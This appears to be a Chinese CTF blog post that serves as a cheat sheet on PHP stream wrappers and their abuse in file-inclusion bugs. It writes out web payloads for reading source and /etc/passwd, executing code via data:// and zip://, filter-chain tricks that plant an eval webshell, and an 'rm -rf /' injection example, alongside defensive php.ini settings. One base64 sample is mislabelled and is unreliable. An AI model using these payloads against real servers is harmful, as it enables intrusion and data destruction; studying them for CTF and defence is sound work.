---
title: php伪协议
published: 2026-01-20
pubDate: 2026-01-20
description: php伪协议
pinned: false
tags: ["web"]
author: zsm
category: CTF-web
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web

我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手

## 速查版本

| 协议名称     | 核心用途                     | 关键语法格式示例                                                                             | 依赖配置参数                            | 主要安全风险                 | 典型应用场景                              |
| ------------ | ---------------------------- | -------------------------------------------------------------------------------------------- | --------------------------------------- | ---------------------------- | ----------------------------------------- |
| file://      | 访问本地文件系统             | file:///绝对路径/文件、file://../../相对路径/文件                                            | 无依赖                                  | 本地文件泄露、目录遍历       | 读取敏感文件（/etc/passwd）、目录穿越攻击 |
| http://      | 访问远程 HTTP 资源           | http://域名/远程脚本.php、http://IP:端口/文件                                                | allow_url_fopen=On allow_url_include=On | 远程代码执行（RFI）          | 远程文件包含恶意脚本                      |
| https://     | 访问加密远程 HTTP 资源       | https://安全域名/脚本.php                                                                    | 同http://                               | 同http://                    | 加密传输下的远程文件包含                  |
| ftp://       | 通过 FTP 访问远程文件        | ftp://用户名:密码@FTP服务器/文件、ftp://匿名账号@服务器/路径                                 | allow_url_fopen=On                      | 未授权文件访问、恶意文件上传 | FTP 文件读取 / 上传漏洞利用               |
| php://input  | 读取 HTTP 请求体原始数据     | php://input（无额外参数）                                                                    | allow_url_include=On                    | 代码注入                     | 文件包含中注入 PHP 代码                   |
| php://filter | 对文件内容过滤 / 编码转换    | php://filter/过滤器链/resource=目标文件 php://filter/convert.base64-encode/resource=flag.php | 无依赖（读取） 部分过滤需特定配置       | 源码泄露、绕过过滤           | 读取编码后的源码、绕过安全检测            |
| zip://       | 访问 ZIP 压缩包内文件        | zip://压缩包绝对路径%23子文件名 zip:///test.zip%23shell.php                                  | 无依赖                                  | 压缩包内恶意代码执行         | 伪装图片等后缀的压缩包包含攻击            |
| data://      | 直接嵌入数据执行             | data://text/plain,代码 data://text/plain;base64,编码后代码                                   | allow_url_fopen=On allow_url_include=On | 代码注入                     | 无文件落地的代码执行                      |
| glob://      | 批量匹配文件路径             | glob://目录/_.php、glob:///etc/[a-z]_                                                        | 无依赖                                  | 敏感文件路径泄露             | 枚举服务器文件结构                        |
| phar://      | 访问 Phar 归档 /zip 包内资源 | phar://归档文件/子文件 phar://test.zip/shell.php                                             | PHP≥5.3.0 无依赖                        | 归档内恶意代码执行           | Phar 反序列化漏洞、压缩包包含攻击         |
| ssh2://      | 通过 SSH 访问远程文件        | ssh2://用户名:密码@主机/文件                                                                 | 需 SSH 扩展                             | 远程文件未授权访问           | SSH 协议相关漏洞利用                      |
| rar://       | 访问 RAR 压缩包内文件        | rar://压缩包路径#子文件名                                                                    | 需 RAR 扩展                             | 同zip://                     | RAR 压缩包相关漏洞利用                    |
| expect://    | 执行交互式命令               | expect://系统命令                                                                            | 需 Expect 扩展                          | 命令注入                     | 命令执行漏洞利用                          |

## 详细内容

### 定义

PHP伪协议（PHP Wrappers）是PHP内置的特殊协议/方案，允许通过统一的URL结构或数据流方式访问不同类型的资源（本地文件、远程数据、输入输出流等）。其核心作用是通过特定前缀（如`file://`、`php://`）让PHP以不同方式处理数据，广泛应用于文件操作、流处理等场景。

伪协议的执行依赖PHP配置参数：

- `allow_url_fopen`：控制是否允许打开URL文件（On/Off）；
- `allow_url_include`：控制是否允许引用URL文件（On/Off）。  
  不同协议对这两个参数的依赖不同（具体见各协议说明）。

- **php://output**：直接向HTTP响应输出内容，通过流控制输出（区别于`echo`的即时打印）。
- **php://stderr**：向标准错误流输出错误信息，用于日志记录，避免错误直接暴露在Web页面。

### 过滤器流：php://filter

- **作用**：对文件内容进行过滤、转换或解码（如编码、压缩、加密），无需修改文件本身。
- **基本格式**：`php://filter/[read=过滤器链]/resource=目标文件`
  - `read=过滤器链`：可选，指定读取时的过滤器（如`convert.base64-encode`）。
  - `resource`：必需，指定目标文件路径。
- **常见过滤器**：  
  | 类型 | 过滤器示例 | 作用 |
  | ------------ | ----------------------- | ------------------------------ |
  | 字符串过滤器 | `string.rot13` | ROT13编码/解码（字母轮换13位） |
  | | `string.toupper` | 内容转为大写 |
  | | `string.strip_tags` | 去除HTML/PHP标签（防XSS） |
  | 转换过滤器 | `convert.base64-encode` | Base64编码文件内容 |
  | | `convert.base64-decode` | Base64解码文件内容 |
  | 压缩过滤器 | `zlib.deflate` | Deflate算法压缩内容 |
  | | `zlib.inflate` | 解压Deflate压缩内容 |
- **用法示例**：
  - 读取Base64编码的flag.php：`?file=php://filter/convert.base64-encode/resource=flag.php`
  - ROT13编码读取：`?file=php://filter/read=string.rot13/resource=flag.php`

### 内存与临时文件流：php://memory、php://temp

- **php://memory**：操作内存中的虚拟文件，数据存储在内存中，脚本结束后丢失，性能高效（内存操作快于磁盘）。
- **php://temp**：数据先存内存，超出限制（通常2MB）后自动切换到磁盘，避免内存溢出，脚本结束后数据丢失。

### 伪文件流：php://fd

- **作用**：直接与操作系统文件描述符交互（文件描述符是打开文件/设备的整数标识符），用于低级文件操作。

### zip:// 协议

- **作用**：处理ZIP压缩文件中的子文件，支持任意后缀名（如将`test.zip`改为`test.jpg`仍可访问）。
- **基本格式**：`zip://绝对路径/压缩文件%23子文件名`（`%23`是`#`的URL编码）。
- **用法示例**：  
  压缩`shell.php`为`test.zip`，改名为`test.xxx`，通过`?file=zip:///var/www/test.xxx%23shell.php`执行代码。
- **配置依赖**：不受`allow_url_fopen`和`allow_url_include`影响。

### data:// 协议

- **作用**：通过Data URI方案嵌入数据，无需文件系统即可处理数据，支持直接执行PHP代码。
- **基本格式**：`data://text/plain,[数据]` 或 `data://text/plain;base64,[Base64编码数据]`。
- **用法示例**：
  - 直接执行代码：`?file=data://text/plain,<?php phpinfo();?>`
  - Base64编码执行：`?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`
- **配置依赖**：需`allow_url_fopen=On`和`allow_url_include=On`。

### glob:// 协议

- **作用**：查找匹配的文件路径模式（如批量匹配`*.php`文件）。
- **用法示例**：`glob:///var/www/*.php`（列出目录下所有PHP文件）。

### phar:// 协议

- **作用**：访问PHP归档文件（Phar，类似ZIP/TAR）中的资源，支持ZIP格式压缩包。
- **基本格式**：`phar://绝对路径/压缩包/子文件`。
- **用法示例**：`?file=phar://test.zip/shell.php`（读取压缩包内的`shell.php`）。
- **配置依赖**：PHP版本≥5.3.0，不受`allow_url_fopen`和`allow_url_include`影响。

### 其他协议（ssh2://、rar://、ogg://、expect://）

- `ssh2://`：通过SSH2协议访问远程资源。
- `rar://`：处理RAR压缩文件中的子文件。
- `ogg://`：访问音频流资源。
- `expect://`：处理交互式流（如命令交互）。

## 安全风险与防御措施

### 主要安全风险

- **代码注入**：通过`php://input`、`data://`等协议注入恶意代码（如`<?php system('rm -rf /');?>`）。
- **信息泄露**：未过滤的`file://`、`php://filter`可能泄露服务器敏感文件（如`/etc/passwd`、源码）。
- **远程文件包含（RFI）**：`http://`、`ftp://`等协议可执行远程恶意脚本。
- **目录遍历**：结合`../`与`file://`访问未授权路径。

### 防御措施

- **输入验证与过滤**：严格校验用户输入的文件路径，限制仅访问合法文件。
- **禁用危险配置**：在`php.ini`中设置`allow_url_fopen=Off`和`allow_url_include=Off`，禁用远程资源访问。
- **限制文件访问范围**：通过`open_basedir`配置PHP可访问的基目录，禁止跨目录访问。
- **禁用危险函数**：限制`include`、`file_get_contents`等函数的使用，或通过`disable_functions`禁用风险函数。
- **错误处理优化**：配置错误日志记录，避免敏感信息（如文件路径）直接显示在Web页面。

## 特殊场景：exit死亡绕过技巧

当代码中存在`file_put_contents($filename, "<?php exit();" . $content);`时，`exit()`会阻止后续代码执行，可通过以下方法绕过：

### base64编码绕过

- **原理**：利用`php://filter`的`convert.base64-decode`过滤器，将恶意代码Base64编码后写入，解码时覆盖`exit()`。
- **示例**：
  ```
  filename=php://filter/convert.base64-decode/resource=a.php
  content=aPD9waHAgcGhwaW5mbygpOz8+ （前加"a"补全Base64字节，实际解码为<?=@eval($_POST[a]);?>）
  ```

### ROT13编码绕过

- **原理**：用`string.rot13`过滤器对恶意代码ROT13编码，解码后还原代码，规避`exit()`。
- **示例**：
  ```
  filename=php://filter/string.rot13/resource=a.php
  content=<?=@riny($_CBFG[n]);?> （ROT13编码后，解码为<?=@eval($_POST[a]);?>）
  ```

### .htaccess预包含利用

- **原理**：用`string.strip_tags`过滤器去除`.htaccess`中的PHP标签，设置`auto_prepend_file`预包含恶意文件。
- **示例**：

  ```
  filename=php://filter/write=string.strip_tags/resource=.htaccess
  content=?>php_value auto_prepend_file E:\\web\\flagg （去除标签后生效，路径用双反斜杠）
  ```

  - 限制：仅PHP5支持`string.strip_tags`写入过滤。

### 过滤器组合绕过

- **原理**：通过压缩-转小写-解压过滤器链破坏`exit()`代码结构。
- **示例**：

  ```
  filename=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php
  content=php://filter/... （压缩后转小写再解压，使`exit()`失效）
  ```

  - 限制：PHP7.3.0以上版本可能报错，低版本有效。

## 总结

看了一些师傅的blog，大部分内容都是这样的，继续学学学学学学
